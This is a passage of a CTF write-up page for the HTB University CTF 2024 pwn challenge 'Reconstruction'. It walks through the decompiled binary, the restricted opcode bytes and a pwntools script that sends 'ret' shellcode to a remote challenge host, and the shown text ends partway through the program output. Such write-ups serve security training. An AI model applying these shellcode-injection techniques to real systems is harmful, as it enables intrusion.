@@ -1,0 +1,532 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="shortcut icon" href="/favicon.ico"><link rel="manifest" href="/site.webmanifest"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#212830"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><title>Reconstruction | Writeups | Status 418</title><style>pre code.hljs{display:block;overflow-x:auto;padding:1em}code.hljs{padding:3px 5px}/*!
+  Theme: GitHub Dark
+  Description: Dark theme as seen on github.com
+  Author: github.com
+  Maintainer: @Hirse
+  Updated: 2021-05-15
+
+  Outdated base version: https://github.com/primer/github-syntax-dark
+  Current colors taken from GitHub's CSS
+*/.hljs{color:#c9d1d9;background:#0d1117}.hljs-doctag,.hljs-keyword,.hljs-meta .hljs-keyword,.hljs-template-tag,.hljs-template-variable,.hljs-type,.hljs-variable.language_{color:#ff7b72}.hljs-title,.hljs-title.class_,.hljs-title.class_.inherited__,.hljs-title.function_{color:#d2a8ff}.hljs-attr,.hljs-attribute,.hljs-literal,.hljs-meta,.hljs-number,.hljs-operator,.hljs-variable,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id{color:#79c0ff}.hljs-regexp,.hljs-string,.hljs-meta .hljs-string{color:#a5d6ff}.hljs-built_in,.hljs-symbol{color:#ffa657}.hljs-comment,.hljs-code,.hljs-formula{color:#8b949e}.hljs-name,.hljs-quote,.hljs-selector-tag,.hljs-selector-pseudo{color:#7ee787}.hljs-subst{color:#c9d1d9}.hljs-section{color:#1f6feb;font-weight:700}.hljs-bullet{color:#f2cc60}.hljs-emphasis{color:#c9d1d9;font-style:italic}.hljs-strong{color:#c9d1d9;font-weight:700}.hljs-addition{color:#aff5b4;background-color:#033a16}.hljs-deletion{color:#ffdcd7;background-color:#67060c}.content[data-astro-cid-tfjleern] a{color:#4985c1}.content[data-astro-cid-tfjleern] p,.content[data-astro-cid-tfjleern] h2{margin-bottom:24px}.content[data-astro-cid-tfjleern] h2 :not(:first-of-type){margin-top:48px}.content[data-astro-cid-tfjleern] img{max-width:100%;border-radius:8px}.content[data-astro-cid-tfjleern] code{background:#171c22;padding:.2em .5em;border-radius:6px;font-size:85%;margin:0;white-space:pre-wrap;word-wrap:break-word;word-break:break-word;overflow-wrap:anywhere}.content[data-astro-cid-tfjleern] pre{background:#171c22;border-radius:8px;margin:24px 0;display:block;padding:16px;white-space:pre-wrap;word-wrap:break-word;word-break:break-word;overflow-wrap:anywhere}.content[data-astro-cid-tfjleern] pre code{padding:0}
+</style>
+<link rel="stylesheet" href="/_astro/_page_.IxI8udFK.css">
+<style>section[data-astro-cid-kggsjsm4]{display:block}[data-astro-cid-kggsjsm4][data-icon]{fill:#ffffffe6}[data-astro-cid-kggsjsm4][data-icon=github]{width:48px;height:48px;padding:8px}[data-astro-cid-kggsjsm4][data-icon=discord]{width:64px;height:64px}[data-astro-cid-kggsjsm4][data-icon=chevron]{width:16px;height:16px}[data-astro-cid-kggsjsm4][data-icon=archive]{width:36px;height:36px;padding:14px}a[data-astro-cid-kggsjsm4]{background:#171c22;justify-content:space-between;border-radius:8px;flex-direction:row;align-items:center;padding:16px;display:flex;color:inherit}a[data-astro-cid-kggsjsm4]:hover .right[data-astro-cid-kggsjsm4]{margin-right:16px}div[data-astro-cid-kggsjsm4]{flex-direction:row;align-items:center;display:flex;gap:16px}.right[data-astro-cid-kggsjsm4]{margin-right:24px;transition:.1s}
+.wrapper[data-astro-cid-blwjyjpt]{border:2px solid var(--color);background:var(--background);display:inline-block;border-radius:16px;padding:0 8px;font-weight:500;color:var(--textColor);line-height:1.5rem;font-size:.75rem}
+</style></head> <body> <section data-astro-cid-3ef6ksr2> <a class="logo" href="/" data-astro-cid-3ef6ksr2> <img src="/_astro/DalCTF_logo_cleanW.D7mbQLRA_ZwvbxW.webp" alt loading="eager" style="object-fit: contain;" data-astro-cid-3ef6ksr2="true" width="256" height="384" decoding="async"> </a> <div class="links" data-astro-cid-3ef6ksr2> <!-- <div class="dropdown">
+      <a href="#" class="dropdown-toggle" role="button">Weekly Problems <span class="arrow">▼</span></a>
+      <ul class="dropdown-menu">
+        <li><a href="/weekly-problem">This Weeks</a></li>
+        <li><a href="/past-weekly-problems">Past Problems</a></li>
+      </ul>
+    </div> --> <div class="dropdown" data-astro-cid-pqsyg2qg> <a href="#" class="dropdown-toggle" role="button" data-astro-cid-pqsyg2qg> Weekly Problems <span class="arrow" data-astro-cid-pqsyg2qg>▼</span> </a> <ul class="dropdown-menu" data-astro-cid-pqsyg2qg> <li data-astro-cid-pqsyg2qg><a href="/weekly-problem" data-astro-cid-pqsyg2qg>This Week&#39;s Problem(s)</a></li><li data-astro-cid-pqsyg2qg><a href="/past-weekly-problems" data-astro-cid-pqsyg2qg>Past Problems</a></li> </ul> </div>  <a href="/writeups" data-astro-cid-3ef6ksr2>Writeups</a><a href="/competitions" data-astro-cid-3ef6ksr2>Competitions</a> <a class="wrapper" href="https://discord.gg/4vEJJF6CQg" target="_blank" data-astro-cid-vnzlvqnm style="--textColor: #4985C1;--borderColor: #4985C1;--backgroundColor: transparent;"> Join us! </a>  </div> </section>    <section data-astro-cid-bbe6dxrz> <h3 data-astro-cid-bbe6dxrz>HTB University CTF 2024: Binary Badlands</h3> <h1 data-astro-cid-bbe6dxrz>Reconstruction</h1>  <div data-astro-cid-bbe6dxrz>  <div class="tags" data-astro-cid-tfjleern> <p class="wrapper" data-astro-cid-blwjyjpt style="--color: #E01A00;--textColor: #E01A00;--background: transparent;">Pwn</p> </div>  </div> </section>   <section data-astro-cid-kggsjsm4> <a href="https://github.com/DalCTF/HTBCTF2024/tree/main/Pwn/Reconstruction" target="_blank" data-astro-cid-kggsjsm4> <div class="left" data-astro-cid-kggsjsm4> <svg width="1.03em" height="1em" data-astro-cid-kggsjsm4="true" data-icon="github">   <symbol id="ai:local:github" viewBox="0 0 98 96"><path fill="currentColor" fill-rule="evenodd" d="M48.854 0C21.839 0 0 22 0 49.217c0 21.756 13.993 40.172 33.405 46.69 2.427.49 3.316-1.059 3.316-2.362 0-1.141-.08-5.052-.08-9.127-13.59 2.934-16.42-5.867-16.42-5.867-2.184-5.704-5.42-7.17-5.42-7.17-4.448-3.015.324-3.015.324-3.015 4.934.326 7.523 5.052 7.523 5.052 4.367 7.496 11.404 5.378 14.235 4.074.404-3.178 1.699-5.378 3.074-6.6-10.839-1.141-22.243-5.378-22.243-24.283 0-5.378 1.94-9.778 5.014-13.2-.485-1.222-2.184-6.275.486-13.038 0 0 4.125-1.304 13.426 5.052a47 47 0 0 1 12.214-1.63c4.125 0 8.33.571 12.213 1.63 9.302-6.356 13.427-5.052 13.427-5.052 2.67 6.763.97 11.816.485 13.038 3.155 3.422 5.015 7.822 5.015 13.2 0 18.905-11.404 23.06-22.324 24.283 1.78 1.548 3.316 4.481 3.316 9.126 0 6.6-.08 11.897-.08 13.526 0 1.304.89 2.853 3.316 2.364 19.412-6.52 33.405-24.935 33.405-46.691C97.707 22 75.788 0 48.854 0" clip-rule="evenodd"/></symbol><use href="#ai:local:github"></use>  </svg> <p class="emphasis" data-astro-cid-kggsjsm4>View on GitHub</p> </div> <div class="right" data-astro-cid-kggsjsm4> <svg width="0.95em" height="1em" data-astro-cid-kggsjsm4="true" data-icon="chevron">   <symbol id="ai:local:chevron" viewBox="0 0 16 17"><g fill="none"><g clip-path="url(#a)"><path fill="currentColor" d="M13.057 8.48a.78.78 0 0 0-.251-.574L5.93 1.17a.8.8 0 0 0-.573-.226.777.777 0 0 0-.79.79.83.83 0 0 0 .225.565l6.32 6.18-6.32 6.18a.8.8 0 0 0-.225.565c0 .451.347.79.79.79a.78.78 0 0 0 .573-.234l6.875-6.728a.8.8 0 0 0 .251-.573z"/></g><defs><clipPath id="a"><path fill="currentColor" d="M0 .5h16v16H0z"/></clipPath></defs></g></symbol><use href="#ai:local:chevron"></use>  </svg> </div> </a> </section>  <span style="display: block; height: 64px"></span>  <section class="content" data-astro-cid-tfjleern> <div data-astro-cid-tfjleern><h2>Analysis</h2>
+<p>The problem give us a 64-bit ELF executable with PIE enable that prompt us to enter certain inputs to exploit the logic of the program to give us the flag.</p>
+<h2>Solution</h2>
+<h3>Gathering info:</h3>
+<p>Checksec the executable give us:</p>
+<pre><code class="hljs">gef➤ checksec
+[<span class="hljs-operator">+</span>] checksec for &#x27;<span class="hljs-operator">/</span>Documents<span class="hljs-operator">/</span>HTB<span class="hljs-operator">/</span>pwn<span class="hljs-operator">/</span>Reconstruction<span class="hljs-operator">/</span>pwn_reconstruction<span class="hljs-operator">/</span>challenge<span class="hljs-operator">/</span>reconstruction&#x27;
+<span class="hljs-params">Canary    :</span> ✓ (<span class="hljs-params">value:</span> <span class="hljs-number">0</span>x2ae85bcf9e350800)
+<span class="hljs-params">NX        :</span> ✗
+<span class="hljs-params">PIE       :</span> ✓
+<span class="hljs-params">Fortify   :</span> ✗
+<span class="hljs-params">RELRO     :</span> Full
+</code></pre>
+<p>Even though the program is PIE enable, it won't affect us as we will see later on.</p>
+<p>By opening the executable through Binary Ninja, we can see there are 4 main functions that we need to focus on:</p>
+<p><code>main()</code> :</p>
+<pre><code class="hljs language-c"><span class="hljs-type">int64_t</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">void</span>* fsbase;
+    <span class="hljs-type">int64_t</span> var_10 = *(<span class="hljs-type">uint64_t</span>*)((<span class="hljs-type">char</span>*)fsbase + <span class="hljs-number">0x28</span>);
+    banner();
+    <span class="hljs-type">int32_t</span> buffer = <span class="hljs-number">0</span>;
+    <span class="hljs-type">char</span> var_11 = <span class="hljs-number">0</span>;
+    printstr(<span class="hljs-string">&quot;\n[*] Initializing components...…&quot;</span>);
+    sleep(<span class="hljs-number">1</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1b[1;31m&quot;</span>);
+    printstr(<span class="hljs-string">&quot;[-] Error: Misaligned components…&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1b[1;34m&quot;</span>);
+    printstr(<span class="hljs-string">&quot;[*] If you intend to fix them, t…&quot;</span>);
+    read(<span class="hljs-number">0</span>, &amp;buffer, <span class="hljs-number">4</span>);
+    
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(&amp;buffer, &amp;data_344c, <span class="hljs-number">3</span>, &amp;data_344c) != <span class="hljs-number">0</span>)
+    {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1b[1;31m&quot;</span>);
+        printstr(<span class="hljs-string">&quot;[-] Mission failed!\n\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x520</span>);
+    }
+    <span class="hljs-keyword">else</span>
+    {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1b[1;33m&quot;</span>);
+        printstr(<span class="hljs-string">&quot;[!] Carefully place all the comp…&quot;</span>);
+        
+        <span class="hljs-keyword">if</span> (check() != <span class="hljs-number">0</span>)
+            read_flag();
+    }
+    
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x520</span>);
+    <span class="hljs-comment">/* tailcall */</span>
+    <span class="hljs-keyword">return</span> setup();
+}
+</code></pre>
+<p><code>check()</code> :</p>
+<pre><code class="hljs language-c"><span class="hljs-type">int64_t</span> <span class="hljs-title function_">check</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">void</span>* fsbase;
+    <span class="hljs-type">int64_t</span> rax = *(<span class="hljs-type">uint64_t</span>*)((<span class="hljs-type">char</span>*)fsbase + <span class="hljs-number">0x28</span>);
+    <span class="hljs-type">int64_t</span>* inputBuffer = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">60</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0</span>);
+    
+    <span class="hljs-keyword">if</span> (inputBuffer == <span class="hljs-number">-1</span>)
+    {
+        perror(<span class="hljs-string">&quot;mmap&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+    
+    <span class="hljs-type">int64_t</span> s;
+    __builtin_memset(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">61</span>);
+    read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">60</span>);
+    *(<span class="hljs-type">uint64_t</span>*)inputBuffer = s;
+    __builtin_memset(&amp;inputBuffer[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
+    <span class="hljs-type">int64_t</span> var_40;
+    inputBuffer[<span class="hljs-number">5</span>] = var_40;
+    *(<span class="hljs-type">uint64_t</span>*)((<span class="hljs-type">char</span>*)inputBuffer + <span class="hljs-number">45</span>) = var_40;
+    <span class="hljs-type">int64_t</span> var_33;
+    *(<span class="hljs-type">uint64_t</span>*)((<span class="hljs-type">char</span>*)inputBuffer + <span class="hljs-number">53</span>) = var_33;
+    
+    <span class="hljs-keyword">if</span> (validate_payload(inputBuffer, <span class="hljs-number">59</span>) == <span class="hljs-number">0</span>)
+    {
+        error(<span class="hljs-string">&quot;Invalid payload! Execution denie…&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+    
+    inputBuffer();
+    munmap(inputBuffer, <span class="hljs-number">60</span>);
+    <span class="hljs-type">char</span> var_79 = <span class="hljs-number">0</span>;
+    <span class="hljs-type">int64_t</span> result;
+    
+    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)
+    {
+        <span class="hljs-keyword">if</span> (var_79 &gt; <span class="hljs-number">6</span>)
+        {
+            result = <span class="hljs-number">1</span>;
+            <span class="hljs-keyword">break</span>;
+        }
+        
+        <span class="hljs-type">int64_t</span> r12;
+        <span class="hljs-type">int64_t</span> r13;
+        <span class="hljs-type">int64_t</span> r14;
+        <span class="hljs-type">int64_t</span> r15;
+        
+        <span class="hljs-keyword">if</span> (regs(&amp;buf[((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79))], r12, r13, r14, r15) != *(<span class="hljs-type">uint64_t</span>*)((((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79)) &lt;&lt; <span class="hljs-number">3</span>) + &amp;values))
+        {
+            <span class="hljs-type">int64_t</span> rbx_2 = *(<span class="hljs-type">uint64_t</span>*)((((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79)) &lt;&lt; <span class="hljs-number">3</span>) + &amp;values);
+            <span class="hljs-type">int64_t</span> rax_17 = regs(&amp;buf[((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79))], r12, r13, r14, r15);
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n[-] Value of [ %s$%s%s ]: [ …&quot;</span>, <span class="hljs-string">&quot;\x1b[1;31m&quot;</span>, <span class="hljs-string">&quot;\x1b[1;35m&quot;</span>, &amp;buf[((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79))], <span class="hljs-string">&quot;\x1b[1;31m&quot;</span>, <span class="hljs-string">&quot;\x1b[1;35m&quot;</span>, rax_17, <span class="hljs-string">&quot;\x1b[1;31m&quot;</span>, <span class="hljs-string">&quot;\x1b[1;32m&quot;</span>, <span class="hljs-string">&quot;\x1b[1;33m&quot;</span>, rbx_2, <span class="hljs-string">&quot;\x1b[1;32m&quot;</span>);
+            result = <span class="hljs-number">0</span>;
+            <span class="hljs-keyword">break</span>;
+        }
+        
+        var_79 += <span class="hljs-number">1</span>;
+    }
+    
+    <span class="hljs-keyword">if</span> (rax == *(<span class="hljs-type">uint64_t</span>*)((<span class="hljs-type">char</span>*)fsbase + <span class="hljs-number">0x28</span>))
+        <span class="hljs-keyword">return</span> result;
+    
+    <span class="hljs-keyword">return</span> __stack_chk_fail();
+}
+</code></pre>
+<p><code>validate_payload()</code> :</p>
+<pre><code class="hljs language-c"><span class="hljs-type">int64_t</span> <span class="hljs-title function_">validate_payload</span><span class="hljs-params">(<span class="hljs-type">int64_t</span> inputBuffer, <span class="hljs-type">int64_t</span> number59)</span>
+{
+    <span class="hljs-type">void</span>* fsbase;
+    <span class="hljs-type">int64_t</span> rax = *(<span class="hljs-type">uint64_t</span>*)((<span class="hljs-type">char</span>*)fsbase + <span class="hljs-number">0x28</span>);
+    <span class="hljs-type">void</span>* var_20 = nullptr;
+    <span class="hljs-type">int64_t</span> result;
+    
+    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)
+    {
+        <span class="hljs-keyword">if</span> (var_20 &gt;= number59)
+        {
+            result = <span class="hljs-number">1</span>;
+            <span class="hljs-keyword">break</span>;
+        }
+        
+        <span class="hljs-type">int32_t</span> isByteMatch = <span class="hljs-number">0</span>;
+        
+        <span class="hljs-keyword">for</span> (<span class="hljs-type">int64_t</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">17</span>; i += <span class="hljs-number">1</span>)
+        {
+            <span class="hljs-keyword">if</span> (*(<span class="hljs-type">uint8_t</span>*)((<span class="hljs-type">char</span>*)var_20 + inputBuffer) == *(<span class="hljs-type">uint8_t</span>*)(i + &amp;allowed_bytes))
+            {
+                isByteMatch = <span class="hljs-number">1</span>;
+                <span class="hljs-keyword">break</span>;
+            }
+        }
+        
+        <span class="hljs-keyword">if</span> (isByteMatch == <span class="hljs-number">0</span>)
+        {
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n[-] Invalid byte detected: 0…&quot;</span>, <span class="hljs-string">&quot;\x1b[1;31m&quot;</span>, ((<span class="hljs-type">uint64_t</span>)*(<span class="hljs-type">uint8_t</span>*)((<span class="hljs-type">char</span>*)var_20 + inputBuffer)), var_20);
+            result = <span class="hljs-number">0</span>;
+            <span class="hljs-keyword">break</span>;
+        }
+        
+        var_20 += <span class="hljs-number">1</span>;
+    }
+    
+    <span class="hljs-keyword">if</span> (rax == *(<span class="hljs-type">uint64_t</span>*)((<span class="hljs-type">char</span>*)fsbase + <span class="hljs-number">0x28</span>))
+        <span class="hljs-keyword">return</span> result;
+    
+    <span class="hljs-keyword">return</span> __stack_chk_fail();
+}
+</code></pre>
+<p><code>regs()</code> :</p>
+<pre><code class="hljs language-c"><span class="hljs-type">int64_t</span> <span class="hljs-title function_">regs</span><span class="hljs-params">(<span class="hljs-type">int64_t</span> arg1, <span class="hljs-type">int64_t</span> arg2 @ r12, <span class="hljs-type">int64_t</span> arg3 @ r13, <span class="hljs-type">int64_t</span> arg4 @ r14, <span class="hljs-type">int64_t</span> arg5 @ r15)</span>
+{
+    <span class="hljs-type">void</span>* fsbase;
+    <span class="hljs-type">int64_t</span> rax = *(<span class="hljs-type">uint64_t</span>*)((<span class="hljs-type">char</span>*)fsbase + <span class="hljs-number">0x28</span>);
+    <span class="hljs-type">int64_t</span> result = <span class="hljs-number">0</span>;
+    <span class="hljs-type">int32_t</span> rax_2;
+    <span class="hljs-type">int64_t</span> result_1;
+    rax_2 = <span class="hljs-built_in">strcmp</span>(arg1, &amp;data_2008, &amp;data_2008);
+    
+    <span class="hljs-keyword">if</span> (rax_2 != <span class="hljs-number">0</span>)
+    {
+        <span class="hljs-type">int32_t</span> rax_5;
+        <span class="hljs-type">int64_t</span> result_2;
+        rax_5 = <span class="hljs-built_in">strcmp</span>(arg1, &amp;data_200b, &amp;data_200b);
+        
+        <span class="hljs-keyword">if</span> (rax_5 != <span class="hljs-number">0</span>)
+        {
+            <span class="hljs-type">int32_t</span> rax_8;
+            <span class="hljs-type">int64_t</span> result_3;
+            rax_8 = <span class="hljs-built_in">strcmp</span>(arg1, &amp;data_200e, &amp;data_200e);
+            
+            <span class="hljs-keyword">if</span> (rax_8 != <span class="hljs-number">0</span>)
+            {
+                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(arg1, &amp;data_2012, &amp;data_2012) != <span class="hljs-number">0</span>)
+                {
+                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(arg1, &amp;data_2016, &amp;data_2016) != <span class="hljs-number">0</span>)
+                    {
+                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(arg1, &amp;data_201a, &amp;data_201a) != <span class="hljs-number">0</span>)
+                        {
+                            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(arg1, &amp;data_201e, &amp;data_201e) != <span class="hljs-number">0</span>)
+                                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown register: %s\n&quot;</span>, arg1);
+                            <span class="hljs-keyword">else</span>
+                                result = arg5;
+                        }
+                        <span class="hljs-keyword">else</span>
+                            result = arg4;
+                    }
+                    <span class="hljs-keyword">else</span>
+                        result = arg3;
+                }
+                <span class="hljs-keyword">else</span>
+                    result = arg2;
+            }
+            <span class="hljs-keyword">else</span>
+                result = result_3;
+        }
+        <span class="hljs-keyword">else</span>
+            result = result_2;
+    }
+    <span class="hljs-keyword">else</span>
+        result = result_1;
+    
+    <span class="hljs-keyword">if</span> (rax == *(<span class="hljs-type">uint64_t</span>*)((<span class="hljs-type">char</span>*)fsbase + <span class="hljs-number">0x28</span>))
+        <span class="hljs-keyword">return</span> result;
+    
+    <span class="hljs-keyword">return</span> __stack_chk_fail();
+}
+</code></pre>
+<p>&lt;br&gt;</p>
+<p>To get the flag, we would have to reach <code>read_flag()</code> in <code>main()</code>, and to do that, <code>check()</code> has to return a number != 0.</p>
+<p>Looking at the code in both <code>main()</code> and <code>check()</code>, we won't be able to exploit buffer overflow, as the character being read is limited, and the first input is force is be <code>&quot;fix&quot;</code>. If we analyze the code for the second input a bit more, we can see that in order for the input be valid, it has to be from the list of 18 allowed bytes and has to be at least 60 characters, as seen here in <code>validate_payload()</code> .</p>
+<p>List of allow_bytes:</p>
+<pre><code class="hljs language-c">allowed_bytes:
+<span class="hljs-number">49</span> c7 b9 c0 de <span class="hljs-number">37</span> <span class="hljs-number">13</span> c4 c6 ef be ad ca fe c3 <span class="hljs-number">00</span> ba bd
+</code></pre>
+<p>Checking for allowed bytes in the second input in  validate_payload():</p>
+<pre><code class="hljs language-c"><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)
+{
+    <span class="hljs-keyword">if</span> (var_20 &gt;= number59)
+    {
+        result = <span class="hljs-number">1</span>;
+        <span class="hljs-keyword">break</span>;
+    }
+    
+    <span class="hljs-type">int32_t</span> isByteMatch = <span class="hljs-number">0</span>;
+    
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">int64_t</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">17</span>; i += <span class="hljs-number">1</span>)
+    {
+        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">uint8_t</span>*)((<span class="hljs-type">char</span>*)var_20 + inputBuffer) == *(<span class="hljs-type">uint8_t</span>*)(i + &amp;allowed_bytes))
+        {
+            isByteMatch = <span class="hljs-number">1</span>;
+            <span class="hljs-keyword">break</span>;
+        }
+    }
+    
+    <span class="hljs-keyword">if</span> (isByteMatch == <span class="hljs-number">0</span>)
+    {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n[-] Invalid byte detected: 0…&quot;</span>, <span class="hljs-string">&quot;\x1b[1;31m&quot;</span>, ((<span class="hljs-type">uint64_t</span>)*(<span class="hljs-type">uint8_t</span>*)((<span class="hljs-type">char</span>*)var_20 + inputBuffer)), var_20);
+        result = <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">break</span>;
+    }
+    
+    var_20 += <span class="hljs-number">1</span>;
+}
+</code></pre>
+<p>&lt;br&gt; &lt;br&gt;</p>
+<h3>Getting past <code>validate_payload()</code> and <code>inputBuffer()</code> :</h3>
+<p>The biggest roadblock ahead for me was figuring out how to utilize the allowed bytes, as in what do they represent, how the program is using it. This is when I figured out in the function <code>check()</code>, after <code>validate_payload()</code> get called, the input buffer get called as a function! Here's the C and ASM equivalent from Binary Ninja:</p>
+<p>You can see the <code>inputBuffer()</code> being called, with the ASM equivalent <code>call rdx</code> .</p>
+<p>C:</p>
+<pre><code class="hljs language-c"><span class="hljs-keyword">if</span> (validate_payload(inputBuffer, <span class="hljs-number">59</span>) == <span class="hljs-number">0</span>)
+{
+    error(<span class="hljs-string">&quot;Invalid payload! Execution denie…&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+}
+    
+inputBuffer();
+munmap(inputBuffer, <span class="hljs-number">60</span>);
+</code></pre>
+<p>ASM:</p>
+<pre><code class="hljs language-x86asm">000019a6  e8fef9ffff         <span class="hljs-keyword">call</span>    validate_payload
+000019ab  85c0               <span class="hljs-keyword">test</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span>
+000019ad  <span class="hljs-number">7519</span>               <span class="hljs-keyword">jne</span>     <span class="hljs-number">0x19c8</span>
+
+000019af  488d0582190000     <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rel</span> data_3338]
+000019b6  4889c7             <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>  {data_3338, <span class="hljs-string">&quot;Invalid payload! Execution denie…&quot;</span>}
+000019b9  e834fcffff         <span class="hljs-keyword">call</span>    error
+000019be  bf01000000         <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">0x1</span>
+000019c3  e8c8f8ffff         <span class="hljs-keyword">call</span>    exit
+
+000019c8  488b4590           <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x70</span> {var_78}]
+000019cc  <span class="hljs-number">48894598</span>           <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x68</span> {var_70}], <span class="hljs-built_in">rax</span>
+000019d0  488b5598           <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x68</span> {var_70}]
+000019d4  b800000000         <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x0</span>
+000019d9  ffd2               <span class="hljs-keyword">call</span>    <span class="hljs-built_in">rdx</span>
+</code></pre>
+<p>Initially, my prediction for this was our input bytes is an address for a function that we can call in the program when <code>call rdx</code> is executed. But running the program in <code>GDB</code> tells me that the input buffer already got map to a specific address, as I also later found out that is because of the <code>mmap()</code> function.</p>
+<p>=&gt; This mean our input is being used as opcode and operands to create ASM instruction!</p>
+<p>A little research on x86_64 ASM show us that the byte <code>c3</code> is opcode for <code>ret</code> in ASM, which is what I used for my input payload in the exploit script:</p>
+<p>We actually need more then just a return instruction later, but my goal as this point was just to get past the input buffer being call as a function and move foward.</p>
+<p>payload.py</p>
+<pre><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># Remote connection details</span>
+host = <span class="hljs-string">&quot;94.237.50.250&quot;</span>
+port = <span class="hljs-number">54813</span>
+
+<span class="hljs-comment"># Payload to send after &#x27;ts: &#x27;</span>
+payload = <span class="hljs-string">b&#x27;\xc3&#x27;</span> * <span class="hljs-number">60</span>
+
+<span class="hljs-comment"># Connect to the remote host</span>
+conn = remote(host, port)
+
+<span class="hljs-comment"># Wait for &#x27;x&quot;: &#x27; and send &quot;fix&quot;</span>
+output = conn.recvuntil(<span class="hljs-string">b&#x27;x&quot;: &#x27;</span>)
+<span class="hljs-built_in">print</span>(output.decode())
+conn.sendline(<span class="hljs-string">b&#x27;fix&#x27;</span>)
+
+<span class="hljs-comment"># Wait for &#x27;ts: &#x27; and send the payload</span>
+output = conn.recvuntil(<span class="hljs-string">b&#x27;ts: &#x27;</span>)
+<span class="hljs-built_in">print</span>(output.decode())
+conn.send(payload)
+
+output = conn.recv()
+<span class="hljs-built_in">print</span>(output.decode())
+</code></pre>
+<p>Running this script got me successfully passed the <code>inputBuffer()</code> as it only contain a single <code>return;</code> instruction.</p>
+<p>&lt;br&gt; &lt;br&gt;</p>
+<h3>• Playing with registers value:</h3>
+<p>After running the <code>payload.py</code> script, we get this output:</p>
+<pre><code class="hljs">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⢤⣀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠁⠀⠀⠈⢳⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡼⠃⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀
